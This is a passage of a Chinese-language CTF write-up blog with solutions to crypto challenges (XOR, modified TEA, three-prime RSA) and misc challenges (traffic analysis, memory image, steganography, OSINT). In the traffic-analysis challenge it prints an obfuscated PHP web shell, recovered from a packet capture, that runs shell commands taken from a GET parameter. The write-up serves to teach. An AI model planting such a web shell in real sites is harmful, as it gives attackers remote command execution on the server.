<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">φ=124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102547272582607556946597809819206498583700587629821896578436377540232328729792993693280980361351684844458558344121591584147825245121367422062684374122308816800</span><br><span class="line">d=22611589977370520102188494132173206662182894540575368174403027280708176548743712414509190973164201319228760596652928358557224295975095230681067496021808078343144195007103821354677774261541360191905462400209949218721814339047952228144496950320622160175823856053884916779719061830624839737774087658005009858273</span><br><span class="line">m=264482712154170621062930777958510103708372984838245841047957012723716220867587500009954604988711976936661501831365621134205</span><br></pre></td></tr></table></figure>
<p>解得<font color=deepskyblue><strong>flag{yihuo_yuan_lai_xian_ji_suan_liang_bian_de2333}</strong></font>.</p>
<h3 id="Since-you-konw-something："><a href="#Since-you-konw-something：" class="headerlink" title="Since you konw something："></a>Since you konw something：</h3><p>发现仍然是异或，但是这次key不知道，不过提示了非常小，于是按上次的方式遍历key，最后得到key是b’ns’，flag为：<font color=deepskyblue><strong>flag{Y0u_kn0w_th3_X0r_b3tt3r}</strong></font>.代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = <span class="number">218950457292639210021937048771508243745941011391746420225459726647571</span></span><br><span class="line">c_bytes = long_to_bytes(c)</span><br><span class="line">prefix = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key_len <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">  <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; (<span class="number">8</span> * key_len)):</span><br><span class="line">    key_bytes = key.to_bytes(key_len, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    flag = xor(c_bytes, key_bytes)</span><br><span class="line">    <span class="keyword">if</span> flag.startswith(prefix[:<span class="built_in">len</span>(flag)]):</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&quot;key: <span class="subst">&#123;key_bytes&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="茶里茶气："><a href="#茶里茶气：" class="headerlink" title="茶里茶气："></a>茶里茶气：</h3><p>观察代码并结合题目名称得知该算法是魔改的TEA加密，flag长度为25（内部为19），a是将 flag 中每个字符的 ASCII 值转换为十六进制字符串，去掉0x并连接起来形成一个长的字符串，当flag长度为25时l的值恰为199，v0是a 的前 99 位，v1是a的后99位，接下来随机了一个<code>p=446302455051275584229157195942211</code>，又给出了其他几个数据：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">0</span></span><br><span class="line">derta = <span class="number">462861781278454071588539315363</span></span><br><span class="line">v3 = <span class="number">489552116384728571199414424951</span></span><br><span class="line">v4 = <span class="number">469728069391226765421086670817</span></span><br><span class="line">v5 = <span class="number">564098252372959621721124077407</span></span><br><span class="line">v6 = <span class="number">335640247620454039831329381071</span></span><br></pre></td></tr></table></figure>
<p>之后进行32次变换：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v1 += (v0+v2) ^ ( <span class="number">8</span>*v0 + v3 ) ^ ( (v0&gt;&gt;<span class="number">7</span>) + v4 ) ; v1 %= p</span><br><span class="line">    v0 += (v1+v2) ^ ( <span class="number">8</span>*v1 + v5 ) ^ ( (v1&gt;&gt;<span class="number">7</span>) + v6 ) ; v0 %= p</span><br><span class="line">    v2 += derta ; v2 %= p</span><br></pre></td></tr></table></figure>
<p>变换又可以写作：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v1 = (v1 + ((v0+v2) ^ (<span class="number">8</span>*v0 + v3) ^ ((v0 &gt;&gt; <span class="number">7</span>) + v4))) % p</span><br><span class="line">  v0 = (v0 + ((v1+v2) ^ (<span class="number">8</span>*v1 + v5) ^ ((v1 &gt;&gt; <span class="number">7</span>) + v6))) % p</span><br><span class="line">  v2 = (v2 + derta) % p</span><br></pre></td></tr></table></figure>
<p>注意到v2初始值是0，且derta远小于p（p&#x2F;derta≈964），所以v2在每次执行完后其实是(i+1)*derta，从来没有被取过余，代入可转化为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v1 = (v1 + ((v0 + i * derta) ^ (<span class="number">8</span>*v0 + v3) ^ ((v0 &gt;&gt; <span class="number">7</span>) + v4))) % p</span><br><span class="line">  v0 = (v0 + ((v1 + i * derta) ^ (<span class="number">8</span>*v1 + v5) ^ ((v1 &gt;&gt; <span class="number">7</span>) + v6))) % p</span><br></pre></td></tr></table></figure>
<p>而v0和v1是一定会超出p的，所以被取过余。又∵若a+b ≡ c (mod p)，则a ≡ c - b (mod p)，构建逆向算法：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">l = <span class="number">199</span></span><br><span class="line">v0 = <span class="number">190997821330413928409069858571234</span></span><br><span class="line">v1 = <span class="number">137340509740671759939138452113480</span></span><br><span class="line">p = <span class="number">446302455051275584229157195942211</span></span><br><span class="line">derta = <span class="number">462861781278454071588539315363</span></span><br><span class="line">v3 = <span class="number">489552116384728571199414424951</span></span><br><span class="line">v4 = <span class="number">469728069391226765421086670817</span></span><br><span class="line">v5 = <span class="number">564098252372959621721124077407</span></span><br><span class="line">v6 = <span class="number">335640247620454039831329381071</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    v0 = (v0 - ((v1+i*derta) ^ (<span class="number">8</span>*v1 + v5) ^ ((v1 &gt;&gt; <span class="number">7</span>) + v6))) % p</span><br><span class="line">    v1 = (v1 - ((v0+i*derta) ^ (<span class="number">8</span>*v0 + v3) ^ ((v0 &gt;&gt; <span class="number">7</span>) + v4))) % p</span><br><span class="line">a_long = (v0 &lt;&lt; (l // <span class="number">2</span>)) + v1</span><br><span class="line">flag = long_to_bytes(a_long).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>解得flag为：<font color=deepskyblue><strong>flag{f14gg9_te2_1i_7ea_7}</strong></font>.</p>
<h3 id="Just-one-and-more-than-two："><a href="#Just-one-and-more-than-two：" class="headerlink" title="Just one and more than two："></a>Just one and more than two：</h3><p>观察发现是变种的RSA，N为3个大质数的成绩，flag被拆成大小相等的两段，m1和m2所取的mod也不一样，但依旧可以按照之前的方法来解：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> mod_inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span></span><br><span class="line">q = <span class="number">11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span></span><br><span class="line">r = <span class="number">12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span></span><br><span class="line">c1 = <span class="number">8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span></span><br><span class="line">c2 = <span class="number">1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span></span><br><span class="line">N = p*q*r</span><br><span class="line">phiN = (p-<span class="number">1</span>) * (q-<span class="number">1</span>) * (r-<span class="number">1</span>)</span><br><span class="line">d1 = mod_inverse(e, p-<span class="number">1</span>)</span><br><span class="line">d2 = mod_inverse(e, phiN)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, N)</span><br><span class="line">m1_b = long_to_bytes(m1)</span><br><span class="line">m2_b = long_to_bytes(m2)</span><br><span class="line">flag1 = m1_b.decode()</span><br><span class="line">flag2 = m2_b.decode()</span><br><span class="line"><span class="built_in">print</span>(flag1,flag2)</span><br></pre></td></tr></table></figure>
<p>拼合得到flag：<font color=deepskyblue><strong>flag{Y0u_re4lly_kn0w_Euler_4nd_N3xt_Eu1er_is_Y0u!}</strong></font>.</p>
<h2 id="Misc方向：-1"><a href="#Misc方向：-1" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="wireshark-checkin："><a href="#wireshark-checkin：" class="headerlink" title="wireshark_checkin："></a>wireshark_checkin：</h3><p>打开pcapng，根据题目flag应该在文件传输中留有痕迹，在左上角导出对象HTTP中发现有一个flag.txt，找到flag：<font color=deepskyblue><strong>flag{ez_traffic_analyze_isn’t_it}</strong></font>.</p>
<h3 id="wireshark-secret："><a href="#wireshark-secret：" class="headerlink" title="wireshark_secret："></a>wireshark_secret：</h3><p>依旧是导出对象，发现有一张png，导出后在图片上得到flag：<font color=deepskyblue><strong>flag{you_are_gooddddd}</strong></font>.</p>
<h3 id="热心助人的小明同学："><a href="#热心助人的小明同学：" class="headerlink" title="热心助人的小明同学："></a>热心助人的小明同学：</h3><p>根据提示文件是一个内存镜像，下载文件后将格式改为.vmem，用Passware Password Recovery Kit破解得到密码为：<code>ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh</code>，即为flag.</p>
<h3 id="用溯流仪见证伏特台风："><a href="#用溯流仪见证伏特台风：" class="headerlink" title="用溯流仪见证伏特台风："></a>用溯流仪见证伏特台风：</h3><p>搜索相关报导，在<code>http://news.china.com.cn/2024-07/08/content_117297304.shtml</code><br>找到原图清晰版本得到域名为：powerj7kmpzkdhjg4szvcxxgktgk36ezpjxvtosylrpey7svpmrjyuyd.onion，转写16位小写md5得到<code>6c3ea51b6f9d4f5e</code>，即为flag.</p>
<h3 id="你也玩原神吗："><a href="#你也玩原神吗：" class="headerlink" title="你也玩原神吗："></a>你也玩原神吗：</h3><p>发现gif中包含一帧特殊图像，拆解发现其中正中央是经典的乱数假文：<br><code>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</code> 但是末尾出现了四个额外字符quis，左上角是flag is a sentence，左下角是do you know fence，考虑栅栏加密，右上角是<code>iiaaelgtsfkfa</code>，解密得到<code>itisafakeflag</code>，右下角是<code>mesioaabgnhnsggogmyeiade</code>，解密得到<code>maybegenshinisagogdoagem</code>，转换一下得到<code>maybegenshinisagoodgame</code>，即为flag.</p>
<h3 id="字里行间的秘密："><a href="#字里行间的秘密：" class="headerlink" title="字里行间的秘密："></a>字里行间的秘密：</h3><p>打开txt发现藏的有两部分零宽度隐写，破解得到隐写字符分别为<font color=red><strong>i</strong></font>和<font color=red><strong>t_is_k3y</strong></font>，合并得到<font color=red><strong>it_is_k3y</strong></font>，打开docx文档，发现有一行虚空文字，复制粘贴得到flag：<font color=deepskyblue><strong>flag{you_h4ve_4nyth1n9}</strong></font>.</p>
<h3 id="Herta’s-Study："><a href="#Herta’s-Study：" class="headerlink" title="Herta’s Study："></a>Herta’s Study：</h3><p>追踪流，发现上传了一个木马，还有<font color=red><strong>fake{this_is_fake_falg}</strong></font>和名为<code>flag</code>、<code>fla</code>、<code>f</code>的txt记录，导出全部对象后发现以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------350282821911984478142300364923</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;horse.php&quot;</span><br><span class="line">Content-Type: application/x-php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">    <span class="variable">$payload</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="variable">$bbb</span>=<span class="title function_ invoke__">create_function</span>(</span><br><span class="line">        <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;J&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;T&#x27;</span>).<span class="string">&#x27;5z&#x27;</span>),   </span><br><span class="line">        <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp</span></span><br><span class="line"><span class="string">        Kz0xKXsNCiAgICBpZigkaSUy&#x27;</span>.<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#x27;</span>).<span class="string">&#x27;dHJfcm90MTMoJG5zWyRpXSk7DQo</span></span><br><span class="line"><span class="string">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#x27;</span>)   </span><br><span class="line">    );  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$bbb</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------350282821911984478142300364923</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line">提交</span><br><span class="line">-----------------------------350282821911984478142300364923--</span><br><span class="line">文件 horse.php 已被成功上传。&lt;br&gt;文件类型: application/x-php&lt;br&gt;文件大小: 0.435546875 kB&lt;br&gt;文件存储的位置: D:/phpstudy_pro/WWW/ezupload/upload/horse.php</span><br></pre></td></tr></table></figure>
<p>解码中间的构建函数部分后得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line">    <span class="variable">$payload</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="variable">$bbb</span>=<span class="title function_ invoke__">create_function</span>(<span class="variable">$ns</span>,   </span><br><span class="line">        <span class="variable">$ns</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ns</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$ns</span>);<span class="variable">$i</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(<span class="variable">$i</span>%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        		<span class="variable">$ns</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$ns</span>[<span class="variable">$i</span>]);</span><br><span class="line">   		 &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ns</span>; </span><br><span class="line">);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$bbb</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得知</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得知所有输入值的偶数位都经过了rot13变换，而f、flag等文档中都含有类似base64加密的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f					        ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==</span><br><span class="line">flag				    	ZzFeZKt0aTlmX2lmX2Zua2VsZzFfZ30tCt==</span><br><span class="line">fake&#123;this_is_fake_falg&#125;	    ZzFeZKt0aTlmX2lmX2Zua2VsZzFfZ30X</span><br><span class="line">whoami				        d2hiYJ1cOjo=</span><br><span class="line">abcd			    	 	YJJwZNo=</span><br><span class="line">0721				    	MQclMDo=</span><br></pre></td></tr></table></figure>
<p>代入<code>0721</code>对应的值进行检验，变换<code>为MDcyMQo=</code>，恰好是<code>0721</code>的base64，验证完成，对上述f、flag、fake进行变换，得到其中一组为：<code>ZmxhZ3tzSDNfaTRfUzBfNmVBdXQxZnVMLn0gCg==</code>，经过转换得到<font color=deepskyblue><strong>flag{sH3_i4_S0_6eAut1fuL.}</strong></font>.</p>
<h1 id="Week3-施工中…"><a href="#Week3-施工中…" class="headerlink" title="Week3 施工中…"></a>Week3 施工中…</h1>
        
      </div>

         
    </div>
    
     
  </div>
  
    

  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
